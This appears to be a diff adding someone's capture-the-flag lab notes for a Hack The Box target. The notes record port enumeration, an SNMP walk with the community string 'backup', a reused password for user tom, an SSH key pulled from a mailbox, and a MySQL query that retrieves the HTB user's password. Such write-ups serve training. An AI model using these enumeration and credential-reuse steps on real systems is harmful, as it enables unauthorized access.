@@ -1,0 +1,39 @@
+Objective find password for user HTB
+target: 
+    10.129.202.20
+
+Hostname: NIXHARD
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+110/tcp open  pop3
+143/tcp open  imap
+993/tcp open  imaps
+995/tcp open  pop3s
+
+SNMP community string "backup"
+snmpwalk -v2c -c backup $target
+
+Admin <tech@inlanefreight.htb>
+Inlanefreight
+
+user tom password not changed. 
+tom:NMds732Js2761
+
+on imaps server:
+    email to tom containing a ssh private key: 
+        id_rsa_lab3
+
+        chmod 600 id_rsa_lab3.
+        ssh-add id_rsa_lab3
+ssh tom@$target
+checking the /etc folder and found configs for mysql. 
+mysql -u tom -pNMds732Js2761
+tom can logging! 
+
+show databases;
+use users;
+show tables;
+
+select password from users where username='HTB';
+    HTB:cr3n4o7rzse7rzhnckhssncif7ds
